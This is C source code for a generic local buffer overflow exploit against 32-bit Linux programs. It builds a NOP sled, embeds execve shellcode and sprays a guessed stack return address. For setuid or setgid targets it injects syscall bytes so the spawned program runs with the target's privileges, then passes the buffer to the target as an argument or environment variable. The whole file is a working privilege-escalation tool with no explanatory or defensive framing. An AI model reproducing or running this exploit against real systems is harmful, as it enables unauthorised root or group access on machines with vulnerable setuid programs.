#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#define NOP                     0x90

char shellcode[] =
    "\xeb\x1f\x5e\x89\x76\xff\x31\xc0\x88\x46\xff\x89\x46\xff\xb0\x0b"
    "\x89\xf3\x8d\x4e\xff\x8d\x56\xff\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff";

unsigned long get_sp(void)
{
	__asm__("movl %esp,%eax");
}

#define A_BSIZE		1
#define A_OFFSET	2
#define A_ALIGN		3
#define A_VAR		4
#define A_FORCE		5
#define A_PROG2RUN	6
#define A_TARGET	7
#define A_ARG		8

int main(int argc, char *argv[])
{
	char *buff, *ptr;
	char **args;
	long addr;
	int offset, bsize;
	int i, j, n;
	struct stat stat_struct;
	int align;
	if (argc < A_ARG) {
		printf
		    ("USAGE: %s bsize offset align (var / novar) (force/noforce) prog2run target param\n",
		     argv[0]);
		return -1;
	}
	if (stat(argv[A_TARGET], &stat_struct)) {
		printf("\nCannot stat %s\n", argv[A_TARGET]);
		return 1;
	}
	bsize = atoi(argv[A_BSIZE]);
	offset = atoi(argv[A_OFFSET]);
	align = atoi(argv[A_ALIGN]);

	if (!(buff = malloc(bsize))) {
		printf("Can't allocate memory.\n");
		exit(0);
	}

	addr = get_sp() + offset;
	printf("bsize %d, offset %d\n", bsize, offset);
	printf("Using address: 0lx%lx\n", addr);

	for (i = 0; i < bsize; i += 4)
		*(long *)(&buff[i] + align) = addr;

	for (i = 0; i < bsize / 2; i++)
		buff[i] = NOP;

	ptr = buff + ((bsize / 2) - strlen(shellcode) - strlen(argv[4]));
	if (strcmp(argv[A_FORCE], "force") == 0) {
		if (S_ISUID & stat_struct.st_mode) {
			printf("uid %d\n", stat_struct.st_uid);
			*(ptr++) = 0x31;	/* xorl %eax,%eax       */
			*(ptr++) = 0xc0;
			*(ptr++) = 0x31;	/* xorl %ebx,%ebx       */
			*(ptr++) = 0xdb;
			if (stat_struct.st_uid & 0xFF) {
				*(ptr++) = 0xb3;	/* movb $0x??,%bl       */
				*(ptr++) = stat_struct.st_uid;
			}
			if (stat_struct.st_uid & 0xFF00) {
				*(ptr++) = 0xb7;	/* movb $0x??,%bh       */
				*(ptr++) = stat_struct.st_uid;
			}
			*(ptr++) = 0xb0;	/* movb $0x17,%al       */
			*(ptr++) = 0x17;
			*(ptr++) = 0xcd;	/* int $0x80            */
			*(ptr++) = 0x80;
		}
		if (S_ISGID & stat_struct.st_mode) {
			printf("gid %d\n", stat_struct.st_gid);
			*(ptr++) = 0x31;	/* xorl %eax,%eax       */
			*(ptr++) = 0xc0;
			*(ptr++) = 0x31;	/* xorl %ebx,%ebx       */
			*(ptr++) = 0xdb;
			if (stat_struct.st_gid & 0xFF) {
				*(ptr++) = 0xb3;	/* movb $0x??,%bl       */
				*(ptr++) = stat_struct.st_gid;
			}
			if (stat_struct.st_gid & 0xFF00) {
				*(ptr++) = 0xb7;	/* movb $0x??,%bh       */
				*(ptr++) = stat_struct.st_gid;
			}
			*(ptr++) = 0xb0;	/* movb $0x2e,%al       */
			*(ptr++) = 0x2e;
			*(ptr++) = 0xcd;	/* int $0x80            */
			*(ptr++) = 0x80;
		}
	}
	/* Patch shellcode */
	n = strlen(argv[A_PROG2RUN]);
	shellcode[13] = shellcode[23] = n + 5;
	shellcode[5] = shellcode[20] = n + 1;
	shellcode[10] = n;
	for (i = 0; i < strlen(shellcode); i++)
		*(ptr++) = shellcode[i];
	/* Copy prog2run */
	printf("Shellcode will start %s\n", argv[A_PROG2RUN]);
	memcpy(ptr, argv[A_PROG2RUN], strlen(argv[A_PROG2RUN]));

	buff[bsize - 1] = '\0';

	args = (char **)malloc(sizeof(char *) * (argc - A_TARGET + 3));
	j = 0;
	for (i = A_TARGET; i < argc; i++)
		args[j++] = argv[i];
	if (strcmp(argv[A_VAR], "novar") == 0) {
		args[j++] = buff;
		args[j++] = NULL;
		return execve(args[0], args, NULL);
	} else {
		setenv(argv[A_VAR], buff, 1);
		args[j++] = NULL;
		return execv(args[0], args);
	}
}
